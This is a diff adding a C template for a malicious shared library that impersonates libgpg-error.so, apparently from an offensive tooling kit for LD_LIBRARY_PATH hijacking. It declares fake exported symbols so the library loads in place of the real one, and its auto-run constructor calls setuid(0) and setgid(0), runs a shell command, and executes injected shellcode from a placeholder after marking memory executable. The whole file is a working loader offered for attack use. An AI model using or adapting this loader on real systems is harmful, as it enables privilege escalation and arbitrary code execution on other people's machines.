@@ -1,0 +1,206 @@
+#include <sys/mman.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <dlfcn.h>
+#include <unistd.h>
+#include <string.h>
+
+// Compile as follows
+//gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_LIBRARY_PATH.o sharedLibrary_LD_LIBRARY_PATH.c
+//gcc -shared -o sharedLibrary_LD_LIBRARY_PATH.so sharedLibrary_LD_LIBRARY_PATH.o -ldl
+
+//####INCLUDE####
+
+//####DEFINE####
+
+//####CODE####
+
+static void runmahpayload() __attribute__((constructor));
+
+
+//Ex for libgpg-error.so
+// [...output from readelf here...]
+int gpgrt_ftruncate;
+int gpgrt_logv;
+int gpgrt_strdup;
+int gpgrt_printf_unlocked;
+int gpgrt_ftello;
+int gpg_err_code_to_errno;
+int gpgrt_log_printhex;
+int gpgrt_log_bug;
+int gpgrt_write_hexstring;
+int gpgrt_b64enc_finish;
+int gpgrt_b64enc_write;
+int gpgrt_fileno_unlocked;
+int gpgrt_set_strusage;
+int gpgrt_ftell;
+int gpgrt_argparser;
+int gpgrt_b64dec_finish;
+int gpgrt_asprintf;
+int gpg_strerror;
+int gpgrt_lock_init;
+int gpgrt_log_debug_string;
+int gpgrt_ftrylockfile;
+int gpgrt_realloc;
+int _gpgrt_log_assert;
+int gpgrt_fopen;
+int gpgrt_strconcat;
+int gpgrt_sysopen_nc;
+int _gpgrt_pending_unlocked;
+int gpgrt_getline;
+int gpgrt_vbsprintf;
+int gpgrt_log_fatal;
+int gpgrt_fname_get;
+int gpgrt_fflush;
+int gpgrt_read;
+int gpgrt_log_debug;
+int gpgrt_add_post_log_func;
+int gpgrt_yield;
+int gpgrt_log_clock;
+int gpg_err_code_from_errno;
+int gpgrt_vfprintf_unlocked;
+int gpgrt_fopencookie;
+int gpgrt_b64dec_start;
+int gpgrt_log_get_stream;
+int gpgrt_inc_errorcount;
+int gpgrt_sysopen;
+int gpgrt_write_sanitized;
+int gpgrt_getenv;
+int gpgrt_ungetc;
+int gpgrt_log_get_fd;
+int gpgrt_ferror_unlocked;
+int gpgrt_logv_domain;
+int _gpgrt_get_std_stream;
+int gpgrt_logv_prefix;
+int gpgrt_fprintf_sf_unlocked;
+int gpgrt_get_syscall_clamp;
+int gpgrt_clearerr;
+int gpg_err_init;
+int gpgrt_vasprintf;
+int gpgrt_funlockfile;
+int gpgrt_free;
+int gpgrt_log_info;
+int gpgrt_log_set_sink;
+int gpgrt_syshd_unlocked;
+int gpgrt_log_get_prefix;
+int gpgrt_malloc;
+int gpg_strerror_r;
+int gpg_err_deinit;
+int gpgrt_log;
+int gpgrt_set_alloc_func;
+int gpgrt_clearerr_unlocked;
+int gpgrt_rewind;
+int gpgrt_set_usage_outfnc;
+int gpg_strsource;
+int gpgrt_fprintf_unlocked;
+int gpgrt_check_version;
+int gpgrt_fpopen;
+int gpgrt_ferror;
+int gpgrt_set_confdir;
+int gpgrt_fdopen;
+int gpgrt_fileno;
+int gpgrt_setbuf;
+int gpgrt_lock_trylock;
+int gpgrt_freopen;
+int gpgrt_poll;
+int gpgrt_fprintf_sf;
+int gpgrt_add_emergency_cleanup;
+int gpgrt_b64enc_start;
+int gpgrt_onclose;
+int gpgrt_absfnameconcat;
+int gpgrt_access;
+int gpgrt_fprintf;
+int gpgrt_log_set_prefix;
+int gpgrt_set_nonblock;
+int gpgrt_fopenmem;
+int gpgrt_snprintf;
+int gpgrt_argparse;
+int gpgrt_log_set_socket_dir_cb;
+int gpgrt_set_binary;
+int _gpgrt_getc_underflow;
+int gpgrt_opaque_set;
+int gpgrt_get_errorcount;
+int gpgrt_fread;
+int gpgrt_log_flush;
+int gpgrt_flockfile;
+int gpgrt_chdir;
+int gpgrt_feof_unlocked;
+int gpgrt_fputs_unlocked;
+int _gpgrt_set_std_fd;
+int gpgrt_usage;
+int gpgrt_wipememory;
+int gpgrt_vsnprintf;
+int _gpgrt_pending;
+int _gpgrt_putc_overflow;
+int gpgrt_log_test_fd;
+int gpgrt_strusage;
+int gpgrt_abort;
+int gpgrt_fputc;
+int gpgrt_fseeko;
+int gpgrt_set_syscall_clamp;
+int gpgrt_fclose_snatch;
+int gpgrt_cmp_version;
+int gpgrt_fgetc;
+int gpgrt_log_string;
+int gpgrt_fwrite;
+int gpgrt_setenv;
+int gpgrt_lock_unlock;
+int gpgrt_write;
+int gpgrt_getcwd;
+int gpgrt_calloc;
+int gpgrt_fclose;
+int gpgrt_b64dec_proc;
+int gpgrt_feof;
+int gpgrt_log_set_pid_suffix_cb;
+int gpgrt_fnameconcat;
+int gpgrt_printf;
+int gpgrt_setvbuf;
+int gpgrt_lock_lock;
+int gpgrt_opaque_get;
+int gpgrt_log_printf;
+int gpgrt_reallocarray;
+int gpgrt_fputs;
+int gpgrt_syshd;
+int gpgrt_lock_destroy;
+int gpgrt_set_fixed_string_mapper;
+int gpgrt_vfprintf;
+int gpgrt_log_error;
+int gpgrt_fgets;
+int gpgrt_fdopen_nc;
+int gpgrt_fcancel;
+int gpg_err_code_from_syserror;
+int gpgrt_mkdir;
+int gpgrt_read_line;
+int gpg_err_set_errno;
+int gpgrt_bsprintf;
+int gpgrt_fname_set;
+int gpgrt_tmpfile;
+int gpgrt_get_nonblock;
+int gpgrt_fpopen_nc;
+int gpgrt_fopenmem_init;
+int gpgrt_mopen;
+int gpg_error_check_version;
+int gpgrt_fseek;
+
+
+const unsigned char raw[] = ####SHELLCODE####;
+size_t length = sizeof(raw);
+
+void runmahpayload() {
+        setuid(0);
+        setgid(0);
+        printf("Library hijacked!\n");
+        system("touch /tmp/haxso.txt");
+
+    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char) * length * 2);
+    memcpy(encoded, raw, length);
+
+    //####CALL####
+    
+    unsigned char* decoded = encoded;
+
+    intptr_t pagesize = sysconf(_SC_PAGESIZE);
+    mprotect((void *)(((intptr_t)decoded) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC);
+    int (*ret)() = (int(*)())decoded;
+    ret();
+}
